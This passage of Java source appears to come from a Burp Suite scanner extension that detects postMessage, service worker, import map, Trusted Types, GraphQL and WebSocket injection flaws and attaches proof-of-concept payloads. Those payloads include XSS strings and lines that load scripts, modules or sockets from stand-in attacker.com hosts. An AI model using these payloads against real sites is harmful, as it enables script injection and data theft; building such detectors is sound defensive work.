                    vuln.sinkType = sinksStr;
                    vuln.evidence = extractCodeSnippet(jsCode, handlerPos, 200);
                    vuln.handlerCode = truncatedHandler;
                    vuln.messageKeys = keysStr.isEmpty() ? null : keysStr;
                    vuln.payload = generateDynamicPostMessageExploit(targetUrl, dataKeys, sinks, truncatedHandler);
                    vuln.remediation = "Always validate event.origin against a whitelist. " +
                        "Never use innerHTML with message data. Validate message structure.";
                    vuln.httpMethod = extractHttpMethod(requestResponse);
                    vuln.paramType = "Client-side (postMessage)";
                    vulns.add(vuln);
                } else if (hasOriginCheck && hasUnsafeSink) {
                    // Origin check EXISTS but may be weak (indexOf, startsWith, endsWith, includes)
                    // Only report if we detect a WEAK origin check pattern
                    boolean hasWeakCheck = handlerBody.contains(".indexOf(") ||
                        handlerBody.contains(".startsWith(") ||
                        handlerBody.contains(".endsWith(") ||
                        handlerBody.contains(".includes(") ||
                        handlerBody.contains(".match(") ||
                        handlerBody.contains(".search(");

                    if (hasWeakCheck) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "PostMessage XSS (Weak Origin Check)";
                        vuln.severity = "Medium";
                        vuln.confidence = 72.0;
                        vuln.description = "PostMessage handler uses weak origin validation " +
                            "(indexOf/startsWith/endsWith/includes) with unsafe sink(s): " +
                            sinksStr + ". Attacker can bypass with similar-looking origins.";
                        vuln.parameter = "postMessage event.data";
                        vuln.targetUrl = targetUrl;
                        vuln.sinkType = sinksStr;
                        vuln.evidence = extractCodeSnippet(jsCode, handlerPos, 200);
                        vuln.handlerCode = truncatedHandler;
                        vuln.messageKeys = keysStr.isEmpty() ? null : keysStr;
                        vuln.payload = generateDynamicPostMessageExploit(targetUrl, dataKeys, sinks, truncatedHandler);
                        vuln.remediation = "Use strict origin comparison: event.origin === 'https://trusted.com'";
                        vuln.httpMethod = extractHttpMethod(requestResponse);
                        vuln.paramType = "Client-side (postMessage)";
                        vulns.add(vuln);
                    }
                    // If origin check is strict (===), don't report - it's properly protected
                }

                if (hasWildcardSend) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "PostMessage Wildcard Origin";
                    vuln.severity = "Medium";
                    vuln.confidence = 90.0;
                    vuln.description = "postMessage uses wildcard '*' origin, allowing any receiver. " +
                        "Sensitive data could be leaked to attacker-controlled windows.";
                    vuln.parameter = "postMessage targetOrigin";
                    vuln.targetUrl = targetUrl;
                    vuln.evidence = extractCodeSnippet(jsCode, handlerPos, 150);
                    vuln.payload = "// On attacker page:\nwindow.addEventListener('message', function(e) {\n" +
                        "  // Capture leaked data from " + targetUrl + "\n" +
                        "  console.log('Stolen:', e.data);\n});";
                    vuln.remediation = "Specify exact target origin instead of wildcard.";
                    vuln.httpMethod = extractHttpMethod(requestResponse);
                    vuln.paramType = "Client-side (postMessage)";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[PostMessage] Error: " + e.getMessage());
        }

        return vulns;
    }

    private int findMatchingBrace(String code, int openBracePos) {
        int depth = 1;
        for (int i = openBracePos + 1; i < code.length() && i < openBracePos + 5000; i++) {
            char c = code.charAt(i);
            if (c == '{') depth++;
            else if (c == '}') depth--;
            if (depth == 0) return i;
        }
        return -1;
    }

    // ==================== SERVICE WORKER ANALYSIS ====================

    /**
     * Analyze for Service Worker security issues
     */
    private List<VulnerabilityInfo> analyzeServiceWorker(String responseBody, String jsCode,
                                                          IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check for SW registration
            Matcher swMatcher = SW_REGISTER.matcher(jsCode);

            if (swMatcher.find()) {
                String swRegistrationEvidence = extractCodeSnippet(jsCode, swMatcher.start(), 150);

                // Extract SW URL
                int regStart = swMatcher.end();
                int urlEnd = jsCode.indexOf(")", regStart);
                if (urlEnd > regStart) {
                    String swParams = jsCode.substring(regStart, urlEnd);

                    // Check for overly broad scope
                    if (swParams.contains("scope") && swParams.contains("'/'")) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Service Worker Broad Scope";
                        vuln.severity = "Medium";
                        vuln.confidence = 80.0;
                        vuln.description = "Service Worker registered with root scope '/'. " +
                            "If SW can be controlled, attacker can intercept all site traffic.";
                        vuln.parameter = "Service Worker scope";
                        vuln.targetUrl = targetUrl;
                        vuln.evidence = swRegistrationEvidence;
                        vuln.payload = "N/A - check if SW script is injectable";
                        vuln.remediation = "Limit SW scope to specific paths that need offline support.";
                        vuln.httpMethod = extractHttpMethod(requestResponse);
                        vulns.add(vuln);
                    }

                    // Check if SW URL could be injectable
                    IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                    for (IParameter param : reqInfo.getParameters()) {
                        String paramValue = param.getValue();
                        if (paramValue != null &&
                            (swParams.contains(paramValue) ||
                             paramValue.endsWith(".js") ||
                             paramValue.contains("sw") ||
                             paramValue.contains("worker"))) {

                            VulnerabilityInfo vuln = new VulnerabilityInfo();
                            vuln.type = "Service Worker Path Injection";
                            vuln.severity = "Critical";
                            vuln.confidence = 70.0;
                            vuln.description = "Service Worker registration URL may be injectable. " +
                                "Parameter '" + param.getName() + "' could control SW location.";
                            vuln.parameter = param.getName();
                            vuln.targetUrl = targetUrl;
                            vuln.evidence = swRegistrationEvidence;
                            vuln.payload = "// Inject malicious SW via parameter:\n" +
                                targetUrl + "?" + param.getName() + "=//attacker.com/malicious-sw.js";
                            vuln.remediation = "Hardcode Service Worker paths. Never use user input in SW registration.";
                            populateRequestContext(vuln, param, requestResponse);
                            vulns.add(vuln);
                            break;
                        }
                    }
                }

                // Cache poisoning check: only report if user input is reflected in a cached response
                // Just having SW + cache APIs doesn't make something vulnerable (every PWA has this)
                Matcher cacheMatcher = SW_CACHE.matcher(jsCode);
                if (cacheMatcher.find()) {
                    // Check if any parameter is reflected (required for cache poisoning XSS)
                    IRequestInfo cacheReqInfo = helpers.analyzeRequest(requestResponse);
                    boolean hasReflection = false;
                    String reflectedParam = null;
                    byte[] cacheResponse = requestResponse.getResponse();
                    if (cacheResponse != null) {
                        int cacheBodyOffset = helpers.analyzeResponse(cacheResponse).getBodyOffset();
                        String cacheBody = new String(Arrays.copyOfRange(cacheResponse, cacheBodyOffset, cacheResponse.length), StandardCharsets.UTF_8);
                        for (IParameter p : cacheReqInfo.getParameters()) {
                            String v = p.getValue();
                            if (v != null && v.length() > 3 && cacheBody.contains(helpers.urlDecode(v))) {
                                hasReflection = true;
                                reflectedParam = p.getName();
                                break;
                            }
                        }
                    }
                    if (hasReflection) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Service Worker Cache Poisoning";
                        vuln.severity = "Medium";
                        vuln.confidence = 72.0;
                        vuln.description = "Service Worker caches responses and parameter '" + reflectedParam +
                            "' is reflected in the cached response. XSS could persist across page reloads.";
                        vuln.parameter = reflectedParam;
                        vuln.targetUrl = targetUrl;
                        vuln.evidence = extractCodeSnippet(jsCode, cacheMatcher.start(), 120);
                        vuln.payload = "Inject XSS payload into '" + reflectedParam + "', then trigger cache update";
                        vuln.remediation = "Don't cache responses containing user input. Use vary headers appropriately.";
                        vuln.httpMethod = extractHttpMethod(requestResponse);
                        vulns.add(vuln);
                    }
                }
            }

        } catch (Exception e) {
            callbacks.printError("[ServiceWorker] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== IMPORT MAPS ANALYSIS ====================

    /**
     * Analyze for Import Maps manipulation
     */
    private List<VulnerabilityInfo> analyzeImportMaps(String responseBody, String jsCode,
                                                       IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check for import map presence
            Matcher importMapMatcher = IMPORT_MAP.matcher(responseBody);
            if (importMapMatcher.find()) {
                String importMapEvidence = extractCodeSnippet(responseBody, importMapMatcher.start(), 200);

                // Check if import map content could be injectable
                IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                for (IParameter param : reqInfo.getParameters()) {
                    String paramValue = param.getValue();
                    if (paramValue != null &&
                        (paramValue.contains("importmap") ||
                         paramValue.contains("imports") ||
                         paramValue.contains("\"") && paramValue.contains(":"))) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Import Map Injection";
                        vuln.severity = "Critical";
                        vuln.confidence = 75.0;
                        vuln.description = "Import map content may be injectable. " +
                            "Attacker could redirect module imports to malicious URLs.";
                        vuln.parameter = param.getName();
                        vuln.targetUrl = targetUrl;
                        vuln.evidence = importMapEvidence;
                        vuln.payload = "{\"imports\":{\"react\":\"https://attacker.com/fake-react.js\"}}";
                        vuln.remediation = "Never include user input in import maps. Use CSP to restrict script sources.";
                        populateRequestContext(vuln, param, requestResponse);
                        vulns.add(vuln);
                        break;
                    }
                }
            }

            // Check for dynamic imports with user-controlled URL
            // ONLY report if we can identify a parameter flowing into the import URL
            Matcher dynamicImportMatcher = DYNAMIC_IMPORT.matcher(jsCode);
            if (dynamicImportMatcher.find()) {
                String dynamicEvidence = extractCodeSnippet(jsCode, dynamicImportMatcher.start(), 120);

                // Check if any URL parameter value appears in the import() vicinity
                IRequestInfo diReqInfo = helpers.analyzeRequest(requestResponse);
                boolean paramInImport = false;
                String importParam = null;
                String importContext = jsCode.substring(
                    Math.max(0, dynamicImportMatcher.start() - 100),
                    Math.min(jsCode.length(), dynamicImportMatcher.end() + 200)
                );
                for (IParameter p : diReqInfo.getParameters()) {
                    String v = p.getValue();
                    if (v != null && v.length() > 3) {
                        String decoded = helpers.urlDecode(v);
                        if (importContext.contains(decoded) || importContext.contains(p.getName())) {
                            paramInImport = true;
                            importParam = p.getName();
                            break;
                        }
                    }
                }

                // Also flag if import uses location/document (user-controllable sources)
                boolean usesUserSource = importContext.contains("location.") ||
                    importContext.contains("document.URL") ||
                    importContext.contains("document.referrer") ||
                    importContext.contains("window.name");

                if (paramInImport || usesUserSource) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "Dynamic Import URL Injection";
                    vuln.severity = "High";
                    vuln.confidence = paramInImport ? 80.0 : 72.0;
                    vuln.description = paramInImport
                        ? "Dynamic import() URL references parameter '" + importParam + "'. " +
                          "Attacker can load arbitrary JavaScript modules."
                        : "Dynamic import() URL uses user-controllable source (location/document). " +
                          "May allow loading arbitrary JavaScript modules.";
                    vuln.parameter = paramInImport ? importParam : "URL fragment/path";
                    vuln.targetUrl = targetUrl;
                    vuln.evidence = dynamicEvidence;
                    vuln.payload = "import('https://attacker.com/malicious-module.js')";
                    vuln.remediation = "Whitelist allowed module URLs. Use static imports when possible.";
                    vuln.httpMethod = extractHttpMethod(requestResponse);
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[ImportMaps] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== TRUSTED TYPES ANALYSIS ====================

    /**
     * Analyze for Trusted Types bypass opportunities
     */
    private List<VulnerabilityInfo> analyzeTrustedTypes(String responseBody, String jsCode,
                                                         IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check for Trusted Types policy creation
            Matcher policyMatcher = TRUSTED_TYPES_POLICY.matcher(jsCode);

            if (policyMatcher.find()) {
                String policyCreationEvidence = extractCodeSnippet(jsCode, policyMatcher.start(), 100);

                // Check for default policy (often weak)
                if (DEFAULT_POLICY.matcher(jsCode).find()) {
                    // Extract policy handler
                    int policyStart = jsCode.indexOf("createPolicy", policyMatcher.start());
                    int handlerStart = jsCode.indexOf("{", policyStart);
                    if (handlerStart > 0) {
                        int handlerEnd = findMatchingBrace(jsCode, handlerStart);
                        if (handlerEnd > handlerStart) {
                            String handler = jsCode.substring(handlerStart, handlerEnd + 1);

                            // Check for identity function (s => s, function(s){return s})
                            boolean isIdentity = handler.matches(".*=>\\s*\\w+[,}].*") ||
                                                handler.contains("return s") ||
                                                handler.contains("return input") ||
                                                handler.contains("return value");

                            if (isIdentity) {
                                VulnerabilityInfo vuln = new VulnerabilityInfo();
                                vuln.type = "Trusted Types Default Policy Bypass";
                                vuln.severity = "High";
                                vuln.confidence = 85.0;
                                vuln.description = "Default Trusted Types policy returns input unchanged. " +
                                    "This effectively disables Trusted Types protection.";
                                vuln.parameter = "Any innerHTML sink";
                                vuln.targetUrl = targetUrl;
                                vuln.evidence = policyCreationEvidence;
                                vuln.handlerCode = truncateHandler(handler, 500);
                                vuln.payload = "element.innerHTML = '<img src=x onerror=alert(1)>'";
                                vuln.remediation = "Implement proper sanitization in policy handlers. " +
                                    "Use DOMPurify.sanitize() in createHTML handler.";
                                vuln.httpMethod = extractHttpMethod(requestResponse);
                                vulns.add(vuln);
                            }
                        }
                    }
                }

                // Check for sinks that bypass Trusted Types - only report the
                // identity-policy bypass above (which has real evidence).
                // "Enforcement gaps" where sinks exist without policy.create() are
                // too common and noisy - every app has eval/document.write in libraries.
                // This was at 60% confidence before, below our threshold anyway.
            }

        } catch (Exception e) {
            callbacks.printError("[TrustedTypes] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== GRAPHQL ANALYSIS ====================

    /**
     * Analyze for GraphQL XSS vulnerabilities
     */
    private List<VulnerabilityInfo> analyzeGraphQL(String responseBody,
                                                    IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check if this is a GraphQL response
            boolean isGraphQL = responseBody.contains("\"data\"") &&
                               (responseBody.contains("\"errors\"") ||
                                responseBody.contains("\"__typename\"") ||
                                GRAPHQL_QUERY.matcher(responseBody).find());

            if (!isGraphQL) {
                // Check request for GraphQL
                byte[] request = requestResponse.getRequest();
                String requestStr = new String(request, StandardCharsets.UTF_8);
                isGraphQL = requestStr.contains("query") &&
                           (requestStr.contains("{") && requestStr.contains("}"));
            }

            if (!isGraphQL) return vulns;

            // Check for introspection enabled
            if (responseBody.contains("__schema") || responseBody.contains("__type")) {
                int schemaPos = responseBody.indexOf("__schema");
                if (schemaPos < 0) schemaPos = responseBody.indexOf("__type");
                String introEvidence = schemaPos >= 0 ? extractCodeSnippet(responseBody, schemaPos, 150) : null;

                VulnerabilityInfo vuln = new VulnerabilityInfo();
                vuln.type = "GraphQL Introspection Enabled";
                vuln.severity = "Low";
                vuln.confidence = 95.0;
                vuln.description = "GraphQL introspection is enabled. Attacker can discover " +
                    "all types, fields, and mutations to find injection points.";
                vuln.parameter = "query";
                vuln.targetUrl = targetUrl;
                vuln.evidence = introEvidence;
                vuln.payload = "{__schema{types{name,fields{name}}}}";
                vuln.remediation = "Disable introspection in production. Use allowlist for queries.";
                vuln.httpMethod = extractHttpMethod(requestResponse);
                vulns.add(vuln);
            }

            // Check for user input in GraphQL response that could lead to XSS
            // CRITICAL: Require longer param values (>= 8 chars) to avoid matching
            // common short strings that appear everywhere. Also verify the value
            // contains special chars that would indicate unencoded reflection.
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            for (IParameter param : reqInfo.getParameters()) {
                String paramValue = param.getValue();
                if (paramValue == null || paramValue.length() < 8) continue;

                String decodedValue = helpers.urlDecode(paramValue);
                if (!responseBody.contains(decodedValue)) continue;

                // Check if response is rendered as HTML
                IResponseInfo respInfo = helpers.analyzeResponse(requestResponse.getResponse());
                String contentType = "";
                for (String header : respInfo.getHeaders()) {
                    if (header.toLowerCase().startsWith("content-type:")) {
                        contentType = header.toLowerCase();
                        break;
                    }
                }

                if (contentType.contains("html")) {
                    // Verify the reflection is NOT HTML-encoded
                    int reflectionPos = responseBody.indexOf(decodedValue);
                    if (reflectionPos < 0) continue;

                    // Check surrounding context - is this inside a JSON value, script, or raw HTML?
                    int ctxStart = Math.max(0, reflectionPos - 50);
                    int ctxEnd = Math.min(responseBody.length(), reflectionPos + decodedValue.length() + 50);
                    String surrounding = responseBody.substring(ctxStart, ctxEnd);

                    // Skip if the reflection is inside a JSON string (escaped)
                    boolean inJsonString = surrounding.contains("\\\"") || surrounding.contains("\\/");
                    if (inJsonString) continue;

                    String reflectionEvidence = extractCodeSnippet(responseBody, reflectionPos, 100);

                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "GraphQL Reflected XSS";
                    vuln.severity = "High";
                    vuln.confidence = 75.0;
                    vuln.description = "User input in GraphQL query is reflected in HTML response. " +
                        "Parameter '" + param.getName() + "' value reflected without encoding.";
                    vuln.parameter = param.getName();
                    vuln.targetUrl = targetUrl;
                    vuln.evidence = reflectionEvidence;
                    vuln.payload = "mutation{updateProfile(bio:\"<img src=x onerror=alert(1)>\")}";
                    vuln.remediation = "Encode GraphQL field outputs before HTML rendering. " +
                        "Use parameterized queries.";
                    populateRequestContext(vuln, param, requestResponse);
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[GraphQL] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== WEBSOCKET ANALYSIS ====================

    /**
     * Analyze for WebSocket XSS vulnerabilities
     */
    private List<VulnerabilityInfo> analyzeWebSocket(String responseBody, String jsCode,
                                                      IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check for WebSocket creation
            Matcher wsMatcher = WEBSOCKET_CREATE.matcher(jsCode);

            if (wsMatcher.find()) {
                String wsCreationEvidence = extractCodeSnippet(jsCode, wsMatcher.start(), 150);

                // Extract the WebSocket URL from constructor
                int wsStart = wsMatcher.end();
                int wsUrlEnd = jsCode.indexOf(")", wsStart);
                String extractedWsUrl = null;
                if (wsUrlEnd > wsStart) {
                    String wsUrlParam = jsCode.substring(wsStart, wsUrlEnd).trim();
                    // Try to extract a string literal URL
                    Matcher urlLiteral = Pattern.compile("['\"]([^'\"]+)['\"]").matcher(wsUrlParam);
                    if (urlLiteral.find()) {
                        extractedWsUrl = urlLiteral.group(1);
                    }
                }

                // Check for unsafe message handling
                Pattern wsHandlerPattern = Pattern.compile(
                    "\\.onmessage\\s*=|addEventListener\\s*\\(\\s*['\"]message['\"]",
                    Pattern.CASE_INSENSITIVE
                );

                Matcher wsHandlerMatcher = wsHandlerPattern.matcher(jsCode);
                if (wsHandlerMatcher.find()) {
                    // Extract the handler body
                    int handlerPos = wsHandlerMatcher.start();
                    int funcStart = jsCode.indexOf("{", handlerPos);
                    String wsHandlerBody = null;
                    if (funcStart > 0 && funcStart < handlerPos + 200) {
                        int funcEnd = findMatchingBrace(jsCode, funcStart);
                        if (funcEnd > funcStart) {
                            wsHandlerBody = jsCode.substring(funcStart, Math.min(funcEnd + 1, jsCode.length()));
                        }
                    }

                    // Detect sinks ONLY in the handler body - NOT in the entire JS code.
                    // Finding innerHTML somewhere else on the page doesn't mean WS messages reach it.
                    if (wsHandlerBody == null) {
                        // No handler body = can't verify data flow, skip
                    } else {
                    List<String> sinks = detectSinks(wsHandlerBody);
                    List<String> dataKeys = extractMessageDataKeys(wsHandlerBody);
                    boolean hasUnsafeSink = !sinks.isEmpty();

                    if (hasUnsafeSink) {
                        String sinksStr = String.join(", ", sinks);

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "WebSocket Message XSS";
                        vuln.severity = "High";
                        vuln.confidence = 70.0;
                        vuln.description = "WebSocket message handler uses unsafe sink(s): " + sinksStr + ". " +
                            "If attacker can inject WebSocket messages, XSS is possible.";
                        vuln.parameter = "WebSocket message data";
                        vuln.targetUrl = targetUrl;
                        vuln.sinkType = sinksStr;
                        vuln.evidence = wsCreationEvidence;
                        vuln.handlerCode = wsHandlerBody != null ? truncateHandler(wsHandlerBody, 500) : null;
                        vuln.messageKeys = dataKeys.isEmpty() ? null : String.join(", ", dataKeys);
                        vuln.payload = generateDynamicWebSocketExploit(targetUrl, extractedWsUrl, dataKeys, sinks);
                        vuln.remediation = "Validate and sanitize WebSocket messages. " +
                            "Never use innerHTML with WebSocket data.";
                        vuln.httpMethod = extractHttpMethod(requestResponse);
                        vuln.paramType = "Client-side (WebSocket)";
                        vulns.add(vuln);
                    }
                    } // end else (wsHandlerBody != null)
                }

                // Check for WebSocket URL injection - only flag if URL uses
                // user-controllable sources (hash, search, referrer, window.name)
                // or a parameter value appears in the URL construction.
                // Just having "+" or "`" in the WS URL is not enough (string concatenation is normal).
                if (wsUrlEnd > wsStart) {
                    String wsUrl = jsCode.substring(wsStart, wsUrlEnd);

                    boolean usesUserSource = wsUrl.contains("location.hash") ||
                        wsUrl.contains("location.search") ||
                        wsUrl.contains("document.URL") ||
                        wsUrl.contains("document.referrer") ||
                        wsUrl.contains("window.name");

                    // Check if any parameter value appears in the WS URL construction
                    IRequestInfo wsReqInfo = helpers.analyzeRequest(requestResponse);
                    String wsParam = null;
                    for (IParameter p : wsReqInfo.getParameters()) {
                        String v = p.getValue();
                        if (v != null && v.length() > 3 && wsUrl.contains(helpers.urlDecode(v))) {
                            usesUserSource = true;
                            wsParam = p.getName();
                            break;
                        }
                    }

                    if (usesUserSource) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "WebSocket URL Injection";
                        vuln.severity = "High";
                        vuln.confidence = wsParam != null ? 80.0 : 72.0;
                        vuln.description = "WebSocket URL constructed from " +
                            (wsParam != null ? "parameter '" + wsParam + "'" : "user-controllable source") +
                            ". Attacker may redirect WebSocket to malicious server.";
                        vuln.parameter = wsParam != null ? wsParam : "URL fragment/path";
                        vuln.targetUrl = targetUrl;
                        vuln.evidence = wsCreationEvidence;
                        vuln.payload = "// Dynamic WebSocket URL detected:\n" +
                            "// " + wsUrl.trim() + "\n" +
                            "// Try: " + targetUrl + "?" + (wsParam != null ? wsParam : "wsHost") + "=attacker.com";
                        vuln.remediation = "Hardcode WebSocket URLs or validate against allowlist.";
                        vuln.httpMethod = extractHttpMethod(requestResponse);
                        vuln.paramType = "Client-side (WebSocket URL)";
                        vulns.add(vuln);
                    }
                }
            }

            // Socket.IO URL injection: Only report if the io() URL constructor
            // directly uses a parameter value or URL-controllable source within it.
            // Just having io() + location.* somewhere in JS is NOT evidence (every SPA has this).
            if (jsCode.contains("io(") || jsCode.contains("socket.connect")) {
                int ioPos = jsCode.indexOf("io(");
                if (ioPos < 0) ioPos = jsCode.indexOf("socket.connect");
                if (ioPos >= 0) {
                    // Extract the io() call arguments
                    int argStart = jsCode.indexOf("(", ioPos);
                    int argEnd = argStart >= 0 ? jsCode.indexOf(")", argStart) : -1;
                    if (argStart >= 0 && argEnd > argStart) {
                        String ioArgs = jsCode.substring(argStart + 1, argEnd);
                        // Check if the io() URL directly uses user-controllable values
                        boolean urlIsUserControlled = ioArgs.contains("location.hash") ||
                            ioArgs.contains("location.search") ||
                            ioArgs.contains("document.URL") ||
                            ioArgs.contains("window.name");

                        // Also check if a parameter value appears in the io() args
                        IRequestInfo ioReqInfo = helpers.analyzeRequest(requestResponse);
                        String ioParam = null;
                        for (IParameter p : ioReqInfo.getParameters()) {
                            String v = p.getValue();
                            if (v != null && v.length() > 3 && ioArgs.contains(helpers.urlDecode(v))) {
                                urlIsUserControlled = true;
                                ioParam = p.getName();
                                break;
                            }
                        }

                        if (urlIsUserControlled) {
                            String ioEvidence = extractCodeSnippet(jsCode, ioPos, 120);
                            VulnerabilityInfo vuln = new VulnerabilityInfo();
                            vuln.type = "Socket.IO URL Injection";
                            vuln.severity = "High";
                            vuln.confidence = 75.0;
                            vuln.description = "Socket.IO connection URL uses " +
                                (ioParam != null ? "parameter '" + ioParam + "'" : "user-controllable source") +
                                ". Attacker can redirect WebSocket to a malicious server.";
                            vuln.parameter = ioParam != null ? ioParam : "URL fragment/path";
                            vuln.targetUrl = targetUrl;
                            vuln.evidence = ioEvidence;
                            vuln.payload = "io('wss://attacker.com')";
                            vuln.remediation = "Use hardcoded Socket.IO URLs. Disable autoConnect.";
                            vuln.httpMethod = extractHttpMethod(requestResponse);
                            vuln.paramType = "Client-side (Socket.IO)";
                            vulns.add(vuln);
                        }
                    }
                }
            }

        } catch (Exception e) {
            callbacks.printError("[WebSocket] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== HELPER METHODS ====================

    /**
     * Extract JavaScript code from HTML response
     */
    private String extractJavaScript(String html) {
        StringBuilder js = new StringBuilder();

        // Extract inline scripts
        Pattern scriptPattern = Pattern.compile(
            "<script[^>]*>([\\s\\S]*?)</script>",
            Pattern.CASE_INSENSITIVE
        );
        Matcher matcher = scriptPattern.matcher(html);
        while (matcher.find()) {
            js.append(matcher.group(1)).append("\n");
        }

        // Extract event handlers
        Pattern eventPattern = Pattern.compile(
            "\\s(on\\w+)\\s*=\\s*[\"']([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE
        );
        Matcher eventMatcher = eventPattern.matcher(html);
        while (eventMatcher.find()) {
            js.append(eventMatcher.group(2)).append("\n");
        }

        // Extract javascript: URLs
        Pattern jsUrlPattern = Pattern.compile(
            "href\\s*=\\s*[\"']javascript:([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE
        );
        Matcher jsUrlMatcher = jsUrlPattern.matcher(html);
        while (jsUrlMatcher.find()) {
            js.append(jsUrlMatcher.group(1)).append("\n");
        }

        return js.toString();
    }

    // ==================== REQUEST CONTEXT HELPERS ====================

    /**
     * Get human-readable parameter type name from IParameter type byte
     */
    private String getParamTypeName(byte type) {
        switch (type) {
            case IParameter.PARAM_URL: return "URL";
            case IParameter.PARAM_BODY: return "Body";
            case IParameter.PARAM_COOKIE: return "Cookie";
            case IParameter.PARAM_XML: return "XML";
            case IParameter.PARAM_XML_ATTR: return "XML Attribute";
            case IParameter.PARAM_MULTIPART_ATTR: return "Multipart";
            case IParameter.PARAM_JSON: return "JSON";
            default: return "Unknown";
        }
    }

    /**
     * Extract the HTTP method from a request
     */
    private String extractHttpMethod(IHttpRequestResponse requestResponse) {
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            return reqInfo.getMethod();
        } catch (Exception e) {
            return "GET";
        }
    }

    /**
     * Populate paramType and httpMethod on a VulnerabilityInfo from request context
     */
    private void populateRequestContext(VulnerabilityInfo vuln, IParameter param,
                                         IHttpRequestResponse requestResponse) {
        if (param != null) {
            vuln.paramType = getParamTypeName(param.getType());
        }
        vuln.httpMethod = extractHttpMethod(requestResponse);
    }

    // ==================== DYNAMIC POC HELPERS ====================

    /**
     * Extract the full target URL from an IHttpRequestResponse
     */
    private String extractTargetUrl(IHttpRequestResponse requestResponse) {
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            return reqInfo.getUrl().toString();
        } catch (Exception e) {
            return "https://target-url";
        }
    }

    /**
     * Extract a clean code snippet around a match position
     */
    private String extractCodeSnippet(String code, int position, int contextChars) {
        int start = Math.max(0, position - contextChars);
        int end = Math.min(code.length(), position + contextChars);
        String snippet = code.substring(start, end).trim();
        if (start > 0) snippet = "..." + snippet;
        if (end < code.length()) snippet = snippet + "...";
        return snippet;
    }

    /**
     * Detect message data keys from a postMessage/WebSocket handler body
     */
    private List<String> extractMessageDataKeys(String handlerBody) {
        List<String> keys = new ArrayList<>();
        // Match patterns: event.data.KEY, e.data.KEY, msg.data.KEY, data.KEY
        Pattern keyPattern = Pattern.compile(
            "(?:event|e|msg|message)\\.data\\.([a-zA-Z_$][a-zA-Z0-9_$]*)" +
            "|(?:event|e|msg|message)\\.data\\[\\s*['\"]([a-zA-Z_$][a-zA-Z0-9_$]*)['\"]\\s*\\]",
            Pattern.CASE_INSENSITIVE
        );
        Matcher m = keyPattern.matcher(handlerBody);
        while (m.find()) {
            String key = m.group(1) != null ? m.group(1) : m.group(2);
            if (key != null && !keys.contains(key)) keys.add(key);
        }
        // Also check for destructured: { key1, key2 } = event.data
        Pattern destructure = Pattern.compile(
            "\\{\\s*([^}]+)\\}\\s*=\\s*(?:event|e|msg)\\.data",
            Pattern.CASE_INSENSITIVE
        );
        Matcher dm = destructure.matcher(handlerBody);
        if (dm.find()) {
            for (String part : dm.group(1).split(",")) {
                String k = part.trim().split("\\s")[0].replaceAll("[^a-zA-Z0-9_$]", "");
                if (!k.isEmpty() && !keys.contains(k)) keys.add(k);
            }
        }
        return keys;
    }

    /**
     * Detect specific sinks from code
     */
    private List<String> detectSinks(String code) {
        List<String> sinks = new ArrayList<>();
        String[][] sinkPatterns = {
            {"innerHTML",           "\\.innerHTML\\s*="},
            {"outerHTML",           "\\.outerHTML\\s*="},
            {"document.write",     "document\\.write(ln)?\\s*\\("},
            {"eval",               "\\beval\\s*\\("},
            {"Function",           "new\\s+Function\\s*\\("},
            {"srcdoc",             "\\.srcdoc\\s*="},
            {"insertAdjacentHTML", "\\.insertAdjacentHTML\\s*\\("},
            {"location.href",     "location\\.href\\s*="},
            {"location.assign",   "location\\.assign\\s*\\("},
            {"jQuery.html()",     "\\.html\\s*\\("},
            {"jQuery.append()",   "\\$\\([^)]*\\)\\.append\\s*\\("},
            {"setTimeout",        "setTimeout\\s*\\([^,]*\\+"},
            {"setInterval",       "setInterval\\s*\\([^,]*\\+"},
        };
        for (String[] sp : sinkPatterns) {
            if (Pattern.compile(sp[1], Pattern.CASE_INSENSITIVE).matcher(code).find()) {
                sinks.add(sp[0]);
            }
        }
        return sinks;
    }

    /**
     * Truncate handler code for display, keeping first N chars
     */
    private String truncateHandler(String handler, int maxLen) {
        if (handler == null) return null;
        if (handler.length() <= maxLen) return handler;
        return handler.substring(0, maxLen) + "\n  // ... (truncated)";
    }

    /**
     * Generate dynamic PostMessage exploit PoC
     */
    private String generateDynamicPostMessageExploit(String targetUrl, List<String> dataKeys,
                                                       List<String> sinks, String handlerSnippet) {
        StringBuilder poc = new StringBuilder();
